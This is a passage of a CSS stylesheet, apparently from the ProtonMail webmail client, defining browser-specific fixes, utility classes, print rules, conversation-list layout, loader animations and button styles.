            line-height: -moz-block-height
        }

        .ua-firefox form.searchForm fieldset button,
        .ua-firefox form.searchForm fieldset button .fa {
            line-height: 32px
        }

        .ua-firefox .pm_tag {
            position: relative;
            top: -2px
        }

        .ua-firefox #conversation-view .message>div.summary,
        .ua-firefox #conversation-view .message>div.summary .time .fa-paperclip {
            line-height: 34px;
            height: 34px
        }

        .ua-firefox .pm_table td .pm_button,
        .ua-firefox .pm_table th .pm_button {
            line-height: 36px
        }

        .ua-windows_nt.ua-firefox.ua-firefox #pm_composer .composer .pm_button,
        .ua-windows_nt.ua-firefox.ua-firefox .pm_button,
        .ua-windows_nt.ua-firefox.ua-firefox .pm_buttons a {
            line-height: -moz-block-height
        }

        .ua-windows_nt.ua-firefox.ua-firefox #pm_sidebar section.sidebar .pm_button.round {
            line-height: 30px
        }

        .ua-windows_nt.ua-firefox.ua-firefox .pm_table td .pm_button.round,
        .ua-windows_nt.ua-firefox.ua-firefox .pm_table th .pm_button.round {
            line-height: 32px;
            position: relative
        }

        .ua-windows_nt-6.ua-ie-11-0 #pm_settings #plans .plans .plan .features li .pm_select {
            position: relative;
            top: 10px
        }

        .ua-firefox .pm_button,
        .ua-firefox .pm_buttons a {
            overflow: hidden
        }

        input:-moz-ui-invalid,
        input:invalid {
            border: 0;
            outline: none;
            box-shadow: none;
            -moz-box-shadow: none;
            -webkit-box-shadow: none
        }

        .ua-safari #conversation-list-rows .conversation .subject .pm_labels,
        .ua-safari #conversation-view .message>div.summary .labels .pm_labels {
            top: 0
        }

        .ua-ie-11 #conversation-list-rows .conversation .subject {
            display: inline-block
        }

        .ua-chrome .pm_form input[type=text].TwoFA-input,
        .ua-firefox .pm_form input[type=text].TwoFA-input,
        .ua-ie .pm_form input[type=text].TwoFA-input,
        .ua-safari .pm_form input[type=text].TwoFA-input {
            font-size: 1.1rem;
            letter-spacing: 2px
        }

        .ua-chrome .pm_form input[type=text].TwoFA-input::-webkit-input-placeholder,
        .ua-firefox .pm_form input[type=text].TwoFA-input::-webkit-input-placeholder,
        .ua-ie .pm_form input[type=text].TwoFA-input::-webkit-input-placeholder,
        .ua-safari .pm_form input[type=text].TwoFA-input::-webkit-input-placeholder {
            font-size: 14px;
            letter-spacing: 0;
            line-height: 24px
        }

        .ua-chrome .pm_form input[type=text].TwoFA-input:-moz-placeholder,
        .ua-chrome .pm_form input[type=text].TwoFA-input::-moz-placeholder,
        .ua-firefox .pm_form input[type=text].TwoFA-input:-moz-placeholder,
        .ua-firefox .pm_form input[type=text].TwoFA-input::-moz-placeholder,
        .ua-ie .pm_form input[type=text].TwoFA-input:-moz-placeholder,
        .ua-ie .pm_form input[type=text].TwoFA-input::-moz-placeholder,
        .ua-safari .pm_form input[type=text].TwoFA-input:-moz-placeholder,
        .ua-safari .pm_form input[type=text].TwoFA-input::-moz-placeholder {
            font-size: 14px;
            letter-spacing: 0
        }

        .ua-chrome .pm_form input[type=text].TwoFA-input:-ms-input-placeholder,
        .ua-firefox .pm_form input[type=text].TwoFA-input:-ms-input-placeholder,
        .ua-ie .pm_form input[type=text].TwoFA-input:-ms-input-placeholder,
        .ua-safari .pm_form input[type=text].TwoFA-input:-ms-input-placeholder {
            font-size: 14px;
            letter-spacing: 0
        }

        #pm_slow {
            display: -webkit-box !important;
            display: -webkit-flex !important;
            display: -ms-flexbox !important;
            display: flex !important
        }

        #pm_slow2,
        [id^=eo-] #pm_slow {
            display: none !important
        }

        [id^=eo-] #pm_slow2 {
            display: -webkit-box !important;
            display: -webkit-flex !important;
            display: -ms-flexbox !important;
            display: flex !important
        }

        .m-encrypt-frame {
            z-index: 110
        }

        .m-extract-frame.m-large.m-decrypt {
            left: 55px !important
        }

        html.protonmail,
        html.protonmail body {
            height: 100%
        }

        html.protonmail body .blank {
            background: #fff
        }

        html.protonmail body .lowResolution,
        html.protonmail body .mobileOnly {
            display: none
        }

        html.protonmail body.scroll {
            overflow-y: initial;
            -webkit-overflow-scrolling: touch;
            height: auto !important
        }

        html.protonmail body.appConfigBody-is-mobile {
            height: 100vh;
            min-height: 100%
        }

        html.protonmail body.appConfigBody-is-mobile .desktopOnly {
            display: none !important
        }

        html.protonmail body.appConfigBody-is-mobile .mobileOnly {
            display: block
        }

        html.protonmail body.appConfigBody-is-mobile .mobile-display-column {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-flex: 1;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            min-height: 0
        }

        html.protonmail body.appConfigBody-is-mobile.locked {
            overflow: initial !important
        }

        html.protonmail body.appConfigBody-is-mobile.appConfigBody-showSidebar {
            overflow: hidden !important
        }

        html.protonmail body.appConfigBody-is-mobile.appConfigBody-showSidebar #pm_main {
            display: none
        }

        html.protonmail body.appConfigBody-is-mobile #body {
            height: auto;
            overflow: initial !important
        }

        html.protonmail body.appConfigBody-is-mobile #body #pm_main {
            height: calc(100vh - 70px)
        }

        html.protonmail body.appConfigBody-is-mobile .lowResolution,
        html.protonmail body.appConfigBody-is-tablet .lowResolution {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex
        }

        html.protonmail body.appConfigBody-is-mobile .desktopOnly,
        html.protonmail body.appConfigBody-is-tablet .desktopOnly {
            display: none !important
        }

        html.protonmail body.appConfigBody-is-mobile .notMobile {
            display: none
        }

        html.protonmail .hidden {
            display: none !important
        }

        html.protonmail .visionary {
            color: #6ddcfb
        }

        html.protonmail .plus {
            color: #c6e422
        }

        html.protonmail .lifetime {
            color: #5fdefb
        }

        html.protonmail .professional {
            color: #d4b46e
        }

        html.protonmail .background-primary {
            background: #9397cd
        }

        html.protonmail .background-red-striped {
            background: repeating-linear-gradient(45deg, #f35d5d, #f35d5d 10px, #ec424a 0, #ec424a 20px)
        }

        html.protonmail .background-yellow-striped {
            background: repeating-linear-gradient(45deg, #fcf785, #fcf785 10px, #efea62 0, #efea62 20px)
        }

        html.protonmail .bold {
            font-weight: 700
        }

        html.protonmail .uppercase {
            text-transform: uppercase
        }

        html.protonmail .clear {
            clear: both
        }

        html.protonmail .text-center {
            text-align: center
        }

        html.protonmail .text-left {
            text-align: left
        }

        html.protonmail .text-right {
            text-align: right
        }

        html.protonmail .text-gray {
            color: #555
        }

        html.protonmail .text-light-gray {
            color: #e1e1e1
        }

        html.protonmail .text-green {
            color: #a6cc93
        }

        html.protonmail .text-yellow {
            color: #dfdf19
        }

        html.protonmail .text-red {
            color: #cc9393
        }

        html.protonmail .text-purple {
            color: #9397cd !important
        }

        html.protonmail .text-blue-gray {
            color: #aeaeba
        }

        html.protonmail .border-panel {
            padding: 15px;
            border: 1px solid #acb0bf
        }

        html.protonmail .padding-top {
            padding-top: 10px
        }

        html.protonmail .margin-top {
            margin-top: 10px
        }

        html.protonmail .margin-right {
            margin-right: 10px
        }

        html.protonmail .margin-bottom {
            margin-bottom: 10px
        }

        html.protonmail .margin-left {
            margin-left: 10px
        }

        html.protonmail .spacing-top {
            margin-top: 3rem
        }

        html.protonmail .spacing-bottom {
            margin-bottom: 3rem
        }

        html.protonmail .flex-space-right {
            margin-right: 4px
        }

        html.protonmail .flex-space-left {
            margin-left: 4px
        }

        html.protonmail .flex-space-top {
            margin-top: 4px
        }

        html.protonmail .flex-space-bottom {
            margin-bottom: 4px
        }

        html.protonmail .no-margin {
            margin: 0
        }

        html.protonmail .cursor-pointer {
            cursor: pointer
        }

        html.protonmail .dull {
            opacity: .5
        }

        html.protonmail .emphaseText {
            font-size: 1rem
        }

        html.protonmail .help {
            font-size: 12px;
            font-style: italic
        }

        html.protonmail .or {
            font-size: 75%
        }

        html.protonmail .ellipsis {
            display: inline-block;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        html.protonmail .help-dnd {
            font-style: italic;
            opacity: .8
        }

        html.protonmail .help-dnd:before {
            margin-right: .5em;
            font-family: FontAwesome;
            font-style: normal;
            content: "\F047"
        }

        html.protonmail ::-webkit-input-placeholder {
            color: #aaaabf
        }

        html.protonmail :-moz-placeholder,
        html.protonmail ::-moz-placeholder {
            color: #aaaabf
        }

        html.protonmail ::-ms-input-placeholder,
        html.protonmail input:-ms-input-placeholder {
            color: #aaaabf
        }

        html.protonmail :-ms-input-placeholder {
            color: #aaaabf
        }

        html.protonmail .placeholder-white::-webkit-input-placeholder {
            color: hsla(0, 0%, 100%, .75)
        }

        html.protonmail .placeholder-white:-moz-placeholder,
        html.protonmail .placeholder-white::-moz-placeholder {
            color: hsla(0, 0%, 100%, .75)
        }

        html.protonmail .placeholder-white::-ms-input-placeholder,
        html.protonmail .placeholder-whiteinput:-ms-input-placeholder {
            color: hsla(0, 0%, 100%, .75)
        }

        html.protonmail .placeholder-white:-ms-input-placeholder {
            color: hsla(0, 0%, 100%, .75)
        }

        @media print {
            * {
                word-break: break-word
            }

            blockquote {
                margin-left: 1rem !important;
                padding: 0 !important
            }

            blockquote blockquote blockquote {
                margin-left: 0 !important
            }

            #secured-print * {
                word-break: break-word
            }

            #secured-print table.print {
                width: auto !important
            }

            #secured-print table.print b,
            #secured-print table.print strong {
                font-weight: 400
            }

            #secured-print table.print em,
            #secured-print table.print i {
                font-style: normal
            }

            #secured-print table.print .pm_button {
                margin: 4px 4px 0 0
            }

            #body #conversation-view,
            #pm_view {
                width: 100% !important
            }

            #conversation-list-columns,
            #pm_header-desktop,
            #pm_list,
            #pm_view article.closed,
            .pm_button,
            .pm_buttons,
            .pm_toolbar,
            .sidebar {
                display: none !important;
                visibility: hidden !important
            }

            * {
                overflow: initial !important;
                height: auto !important;
                width: auto !important;
                float: none !important;
                border-radius: 0 !important;
                -webkit-box-shadow: none !important;
                box-shadow: none !important
            }

            .listAttachments-container .listAttachments-att.pm_button {
                display: inline-block !important;
                visibility: visible !important;
                border: 0;
                height: auto;
                line-height: auto;
                margin-bottom: 0
            }

            .listAttachments-container .listAttachments-att.pm_button:after {
                display: none
            }

            .listAttachments-container .listAttachments-att.pm_button .listAttachments-item {
                padding: 0 0 0 20px
            }

            .listAttachments-container .listAttachments-att.pm_button .size {
                clear: none;
                display: inline-block
            }

            .listAttachments-container .listAttachments-att.pm_button .size:before {
                content: "("
            }

            .listAttachments-container .listAttachments-att.pm_button .size:after {
                content: ")"
            }

            .listAttachments-container .listAttachments-att.pm_button [class*=listAttachments-icon] {
                width: 20px;
                font-size: 16px
            }
        }

        #conversation-list-rows {
            clear: both
        }

        body #conversation-list-columns {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            width: 500px;
            width: 40%;
            float: left;
            height: 100%;
            overflow: auto;
            position: relative;
            border-right: 1px solid #acb0bf
        }

        body #conversation-view,
        body #pm_view {
            width: 60%;
            height: 100%;
            overflow: hidden;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            display: -webkit-flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-flex-direction: column
        }

        body #conversation-view.latest,
        body #pm_view.latest {
            overflow-y: scroll;
            overflow-x: hidden
        }

        body.appConfigBody-rows #conversation-view,
        body.appConfigBody-rows #pm_view {
            width: 100%
        }

        body #pm_thread {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            overflow: auto;
            -webkit-overflow-scrolling: touch;
            -webkit-transform: translateZ(0)
        }

        body #pm_thread:focus {
            outline: none
        }

        body #conversation-list-rows {
            height: 100%;
            position: relative;
            overflow: auto
        }

        body #pm_main {
            height: calc(100% - 61px);
            float: left;
            width: calc(100% - 190px)
        }

        body #wrapper {
            position: relative;
            height: calc(100% - 56px);
            overflow: auto;
            -webkit-overflow-scrolling: touch;
            clear: both
        }

        body,
        body #body {
            min-height: 100%
        }

        body.appConfigBody-is-mobile,
        body.appConfigBody-is-mobile #body,
        body.secure,
        body.secure #body {
            overflow: hidden;
            height: 100%
        }

        body.appConfigBody-is-mobile #pm_main {
            float: left;
            height: calc(100% - 60px)
        }

        body.appConfigBody-is-mobile #conversation-list-rows,
        body.appConfigBody-is-mobile #pm_main {
            width: 100%
        }

        body.appConfigBody-is-mobile #conversation-list-columns,
        body.appConfigBody-is-mobile #conversation-view,
        body.appConfigBody-is-mobile #wrapper {
            clear: both;
            float: left;
            width: 100%
        }

        body.appConfigBody-is-mobile #wrapper {
            height: calc(100% - 70px)
        }

        body.appConfigBody-is-mobile #pm_view {
            width: 60%;
            float: left;
            height: 100%;
            overflow-y: scroll;
            overflow-x: hidden
        }

        body.appConfigBody-is-mobile #conversation-list-columns,
        body.appConfigBody-is-mobile #conversation-list-rows,
        body.appConfigBody-is-mobile #conversation-view {
            overflow-y: auto;
            overflow-x: hidden;
            height: 100%
        }

        .conversation {
            background: #fff;
            position: relative;
            height: 60px;
            overflow: hidden;
            border-bottom: 1px solid #acb0bf
        }

        .conversation,
        .conversation .ptSelectConversation-container {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center
        }

        .conversation .ptSelectConversation-container {
            -webkit-justify-content: center;
            -webkit-box-pack: center;
            -ms-flex-pack: center;
            justify-content: center;
            height: 100%;
            width: 38px;
            min-width: 38px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            text-align: center
        }

        .conversation .ptSelectConversation-container input[type=checkbox] {
            margin: 0
        }

        .conversation .conversation-meta {
            -webkit-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-flex: 1;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            min-height: 0;
            max-width: calc(100% - 38px);
            background: inherit
        }

        .conversation .conversation-meta,
        .conversation .row {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex
        }

        .conversation .row {
            padding-right: 10px;
            height: 30px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .conversation .row.top {
            -webkit-align-items: flex-end;
            -webkit-box-align: end;
            -ms-flex-align: end;
            align-items: flex-end;
            padding-bottom: 2px
        }

        .conversation .row.top .location {
            width: 1.25rem;
            float: left;
            height: 20px;
            line-height: 20px;
            color: rgba(0, 0, 0, .35)
        }

        .conversation .row.bottom {
            padding-top: 4px;
            padding-bottom: 10px;
            max-width: 100%;
            cursor: pointer;
            background: inherit
        }

        .conversation .row .meta,
        .conversation .row h4 {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: flex-end;
            -webkit-box-align: end;
            -ms-flex-align: end;
            align-items: flex-end;
            height: 20px
        }

        .conversation .row h4 {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            min-width: 1px;
            font-size: 1em;
            cursor: pointer;
            color: #000
        }

        .conversation .row h4 .fa-mail-forward,
        .conversation .row h4 .fa-mail-reply,
        .conversation .row h4 .fa-mail-reply-all {
            margin-right: 2px
        }

        .conversation .row h4 .folderConversations-container {
            display: block;
            white-space: nowrap
        }

        .conversation .row h4 .folderConversations-container .fa {
            margin-right: 2px
        }

        .conversation .row h4 .subject-text {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            padding: 2px 0;
            margin: -2px 0
        }

        .conversation .row h4 .subject-num-message {
            margin-right: 5px
        }

        .conversation .row .meta {
            -webkit-justify-content: flex-end;
            -webkit-box-pack: end;
            -ms-flex-pack: end;
            justify-content: flex-end
        }

        .conversation .row .meta .fa-paperclip,
        .conversation .row .meta .fa-star,
        .conversation .row .meta .fa-star-o {
            text-decoration: none;
            width: 1rem
        }

        .conversation .row .meta .fa-star,
        .conversation .row .meta .fa-star-o {
            cursor: pointer
        }

        .conversation .row .meta .fa-star-o {
            color: inherit;
            opacity: .3
        }

        .conversation .row .meta .fa-star {
            color: #dfdf19
        }

        .conversation .row .meta .fa-star-o:hover,
        .conversation .row .meta .fa-start {
            opacity: 1
        }

        .conversation .row .meta time.time {
            float: right;
            text-align: right;
            font-style: normal;
            font-size: .9em;
            white-space: nowrap
        }

        .conversation .row .senders {
            float: left;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            font-weight: 700;
            font-size: .8em;
            position: relative;
            top: 1px;
            cursor: pointer
        }

        .conversation .row .senders .senders-name:after {
            content: ", "
        }

        .conversation .row .senders .senders-name:last-of-type:after {
            display: none
        }

        .conversation .row .senders.full {
            width: 100%
        }

        .conversation .row .senders.full .senders-name:after {
            content: ", "
        }

        .conversation .row .senders.full .senders-name:last-of-type:after {
            display: none
        }

        .conversation .row .labelsElement-container {
            position: absolute;
            right: 10px;
            bottom: 10px;
            z-index: 2;
            width: auto;
            height: 18px
        }

        .conversation .conversation-icon-attachment {
            visibility: hidden
        }

        .conversation.hasAttachments .conversation-icon-attachment {
            visibility: visible
        }

        .conversation .expiration {
            position: absolute;
            z-index: 5;
            right: 0;
            top: 0;
            width: 0;
            height: 0;
            border-style: solid;
            border-width: 0 2.5rem 2.5rem 0;
            border-color: transparent #ec6446 transparent transparent;
            color: #fff;
            overflow: visible;
            display: none
        }

        .conversation .expiration .fa {
            position: absolute;
            right: -2.5rem;
            top: 0;
            display: block;
            text-align: center;
            line-height: 1.5rem;
            height: 1.5rem;
            width: 1.5rem
        }

        .conversation.expiring .expiration {
            display: inline
        }

        .conversation.read {
            background: #e6eaf0
        }

        .conversation.read h4 {
            font-weight: 400;
            color: inherit
        }

        .conversation.marked:before {
            background-color: #9397cd;
            content: "";
            display: block;
            position: absolute;
            height: 100%;
            width: 5px;
            top: 0
        }

        .conversation.active {
            background: #828895;
            color: #fff;
            border-bottom-color: #828895
        }

        .conversation.active h4 {
            color: inherit
        }

        .conversation.active .customMaskInput-mask {
            border-color: rgba(0, 0, 0, .5)
        }

        .appConfigBody-request-timeout .conversation {
            display: none
        }

        body #conversation-list-rows .conversation {
            height: 40px;
            line-height: 40px;
            padding: 0;
            border-bottom: 1px solid #acb0bf;
            background: #fff
        }

        body #conversation-list-rows .conversation .ptSelectConversation-container {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-justify-content: center;
            -webkit-box-pack: center;
            -ms-flex-pack: center;
            justify-content: center;
            position: relative;
            float: left;
            padding: 0;
            text-align: center;
            width: 38px
        }

        body #conversation-list-rows .conversation .fa-star,
        body #conversation-list-rows .conversation .fa-star-o {
            text-decoration: none;
            width: 1rem;
            cursor: pointer
        }

        body #conversation-list-rows .conversation .fa-star-o {
            color: inherit;
            opacity: .3
        }

        body #conversation-list-rows .conversation .fa-star {
            color: #dfdf19
        }

        body #conversation-list-rows .conversation .senders {
            width: 16%;
            cursor: pointer
        }

        body #conversation-list-rows .conversation .senders .senders-name:after {
            content: ", "
        }

        body #conversation-list-rows .conversation .senders .senders-name:last-of-type:after {
            display: none
        }

        body #conversation-list-rows .conversation .subject {
            position: relative;
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            width: calc(84% - 17rem);
            padding-left: 4px;
            background: inherit;
            cursor: pointer
        }

        body #conversation-list-rows .conversation .subject h4 {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            height: 40px;
            margin: 0;
            font-size: 1em;
            color: #000;
            max-width: 90%
        }

        body #conversation-list-rows .conversation .subject h4 .subject-text {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            padding: 2px 0;
            margin: -2px 0
        }

        body #conversation-list-rows .conversation .subject h4 .subject-num-message {
            margin: 0 2px
        }

        body #conversation-list-rows .conversation .subject h4 .fa-mail-forward,
        body #conversation-list-rows .conversation .subject h4 .fa-mail-reply,
        body #conversation-list-rows .conversation .subject h4 .fa-mail-reply-all {
            margin-right: 2px
        }

        body #conversation-list-rows .conversation .subject h4 .folderConversations-container {
            display: block;
            white-space: nowrap
        }

        body #conversation-list-rows .conversation .subject h4 .folderConversations-container .fa {
            margin-right: 2px
        }

        body #conversation-list-rows .conversation .subject .location {
            width: 1.25rem;
            float: left;
            height: 40px;
            line-height: 40px;
            color: rgba(0, 0, 0, .35)
        }

        body #conversation-list-rows .conversation .subject .labelsElement-container {
            position: absolute;
            right: 0;
            top: 0;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            height: 100%;
            padding: 10px 0
        }

        body #conversation-list-rows .conversation .size,
        body #conversation-list-rows .conversation .time {
            font-size: .9em
        }

        body #conversation-list-rows .conversation .size {
            width: 5.5rem;
            text-align: right;
            padding-right: 1rem
        }

        body #conversation-list-rows .conversation time.time {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            float: right;
            text-align: right;
            font-style: normal;
            position: relative;
            padding-left: 5px;
            white-space: nowrap
        }

        body #conversation-list-rows .conversation .expiration {
            position: absolute;
            z-index: 5;
            right: 0;
            top: 0;
            width: 0;
            height: 0;
            border-style: solid;
            border-width: 0 2.5rem 2.5rem 0;
            border-color: transparent #ec6446 transparent transparent;
            color: #fff;
            overflow: visible;
            display: none
        }

        body #conversation-list-rows .conversation .expiration .fa {
            position: absolute;
            right: -2.5rem;
            top: 0;
            display: block;
            text-align: center;
            line-height: 1.5rem;
            height: 1.5rem;
            width: 1.5rem
        }

        body #conversation-list-rows .conversation.expiring .expiration {
            display: inline-block
        }

        body #conversation-list-rows .conversation.read {
            background: #e6eaf0
        }

        body #conversation-list-rows .conversation.read .subject h4 {
            font-weight: 400;
            color: inherit
        }

        body #conversation-list-rows .conversation.hasLabels .subject h4 {
            max-width: 80%
        }

        body.appConfigBody-is-mobile .conversation .selection {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-justify-content: center;
            -webkit-box-pack: center;
            -ms-flex-pack: center;
            justify-content: center;
            position: absolute;
            z-index: 99;
            top: 0;
            width: 50px;
            height: 100%
        }

        body.appConfigBody-is-mobile .conversation .ptSelectConversation-container {
            margin: 0;
            width: 50px;
            text-align: left
        }

        body.appConfigBody-is-mobile .conversation .conversation-meta {
            max-width: 100%
        }

        body.appConfigBody-is-mobile .conversation .row {
            padding-left: 50px
        }

        body.appConfigBody-is-mobile .conversation .row h4 {
            width: calc(100% - 11rem)
        }

        body.appConfigBody-is-mobile .conversation .row h4 .fa-mail-forward,
        body.appConfigBody-is-mobile .conversation .row h4 .fa-mail-reply,
        body.appConfigBody-is-mobile .conversation .row h4 .fa-mail-reply-all {
            margin-right: 2px
        }

        body.appConfigBody-is-mobile .conversation .row .folderConversations-container {
            display: inherit
        }

        body.appConfigBody-is-mobile .conversation .row .folderConversations-container i.fa {
            width: 1rem;
            margin-right: 2px;
            text-align: center
        }

        body.appConfigBody-is-mobile .conversation .row .senders.full {
            width: calc(100% - 10rem);
            cursor: pointer
        }

        body.appConfigBody-is-mobile .conversation .row .senders .senders-name:after {
            content: ", "
        }

        body.appConfigBody-is-mobile .conversation .row .senders .senders-name:last-of-type:after {
            display: none
        }

        #pm_loader {
            display: block;
            z-index: 9999999;
            position: fixed;
            right: 25px;
            bottom: 15px;
            height: 5rem;
            width: 5rem
        }

        #domoArigato {
            width: 15rem;
            height: 15rem
        }

        #pm_slow,
        #pm_slow2 {
            text-align: center;
            color: #fff;
            padding: 2rem 0
        }

        .loader em {
            margin: 40px auto;
            font-size: 10px;
            position: relative;
            text-indent: -9999em;
            border-top: .5em solid rgba(0, 0, 0, .05);
            border-right: .5em solid rgba(0, 0, 0, .05);
            border-bottom: .5em solid rgba(0, 0, 0, .05);
            border-left: .5em solid #669;
            -webkit-transform: translateZ(0);
            transform: translateZ(0);
            -webkit-animation: load8 .5s infinite linear;
            animation: load8 .5s infinite linear;
            display: block
        }

        .loader em,
        .loader em:after {
            border-radius: 50%;
            width: 2rem;
            height: 2rem
        }

        .pm-loader-fullpage {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            min-height: 100%;
            background: #505061
        }

        .image {
            position: relative
        }

        .image.loading img {
            display: none
        }

        .image.loading:after {
            position: absolute;
            content: "";
            background: #fff;
            display: inline-block;
            height: 10px;
            width: 10px;
            font-size: 10px;
            border-radius: 50%;
            text-indent: -9999em;
            border-top: .5em solid rgba(0, 0, 0, .05);
            border-right: .5em solid rgba(0, 0, 0, .05);
            border-bottom: .5em solid rgba(0, 0, 0, .05);
            border-left: .5em solid #669;
            -webkit-transform: translateZ(0);
            transform: translateZ(0);
            -webkit-animation: load8 .5s infinite linear;
            animation: load8 .5s infinite linear
        }

        .pm_button {
            text-decoration: none;
            color: #666;
            padding: 0 10px;
            height: 35px;
            line-height: 35px;
            border: 1px solid #acb0bf;
            border-radius: 2px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            display: inline-block;
            font-size: 12px;
            text-transform: uppercase;
            background-color: transparent;
            -webkit-transition: all .3s ease-out;
            transition: all .3s ease-out;
            cursor: pointer;
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            -webkit-tap-highlight-color: transparent;
            vertical-align: middle;
            z-index: 1
        }

        .pm_button:focus,
        .pm_button:hover {
            background-color: #f2f2f2;
            color: #222;
            -webkit-transition: none;
            transition: none
        }

        .pm_button:active {
            background: #e5e5e5;
            -webkit-box-shadow: inset 0 1px 2px 0 rgba(0, 0, 0, .05);
            box-shadow: inset 0 1px 2px 0 rgba(0, 0, 0, .05)
        }

        .pm_button.fullwidth {
            width: 100%
        }

        .pm_button.large {
            line-height: 50px;
            height: 50px;
            padding: 0 2rem;
            font-size: 16px
        }

        .pm_button.primary {
            background-color: #9397cd;
            border-color: #9397cd;
            color: #fff
        }

        .pm_button.primary:focus,
        .pm_button.primary:hover {
            background-color: #8286c5;
            border-color: transparent
        }

        .pm_button.primary:active {
            background-color: #66669a;
            border-color: #66669a
        }

        .pm_button.primary.disabled,
        .pm_button.primary[disabled] {
            background: #9a9ed0
        }

        .pm_button.link {
            background-color: transparent;
            border-color: transparent;
            color: #9397cd;
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .pm_button.link:active,
        .pm_button.link:focus,
        .pm_button.link:hover {
            text-decoration: underline
        }

        .pm_button.autoHeight {
            height: auto;
            line-height: normal
        }

        .pm_button.round {
            display: inline-block;
            height: 30px;
            line-height: 30px;
            width: 30px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            text-align: center;
            border: 1px solid #acb0bf;
            border-radius: 30px;
            padding: 0
        }

        .pm_button.round.big {
            margin-top: -10px;
            font-size: 22px;
            border-radius: 40px;
            width: 40px;
            height: 40px;
            line-height: 40px
        }

        .pm_button.round .fa {
            color: #9397cd
        }

        .pm_button.round:focus,
        .pm_button.round:hover {
            background-color: #fafafa
        }

        .pm_button.round:active {
            background-color: #f4f4f4
        }

        .pm_button.success {
            background-color: #a6cc93;
            border-color: #89bc70;
            color: #fff
        }

        .pm_button.success:focus,
        .pm_button.success:hover {
            background-color: #89bc70;
            border-color: #89bc70
        }

        .pm_button.success.disabled,
        .pm_button.success[disabled] {
            background: #accf9a
        }

        .pm_button.white {
            background: #fff
        }

        .pm_button.dark:hover {
            background: rgba(0, 0, 0, .2)
        }

        .pm_button.error {
            background-color: #cc9393;
            border-color: #bc7070;
            color: #fff
        }

        .pm_button.error:focus,
        .pm_button.error:hover {
            background-color: #bc7070;
            border-color: #bc7070
        }

        .pm_button.error.disabled,
        .pm_button.error[disabled] {
            background: #cf9a9a
        }

        .pm_button.disabled,
        .pm_button[disabled] {
            opacity: .5;
            pointer-events: none;
            cursor: default;
            -webkit-box-shadow: inset 0 0 5rem 0 rgba(0, 0, 0, .06);
            box-shadow: inset 0 0 5rem 0 rgba(0, 0, 0, .06)
        }

        .pm_button.dead {
            pointer-events: none;
            cursor: default
        }

        .pm_button.main {
            padding: 0 20px
        }

        .pm_button.dangerous {
            -webkit-box-shadow: none;
            box-shadow: none;
            border: 0;
            padding: 0 4px;
            margin: 0 10px;
            color: #cc9393
        }

        .pm_button.dangerous span {
            text-decoration: underline
        }

        .pm_button strong {
            font-size: 12px;
            text-transform: uppercase
        }

        .pull-right .pm_buttons {
            margin: 0 0 0 10px
        }

        .pm_buttons {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            border: 1px solid #acb0bf;
            height: 33px;
            margin: 0 10px 0 0;
            position: relative;
            border-radius: 2px;
            color: #666
        }

        .pm_buttons.inline {
            display: inline-block;
            float: none
        }

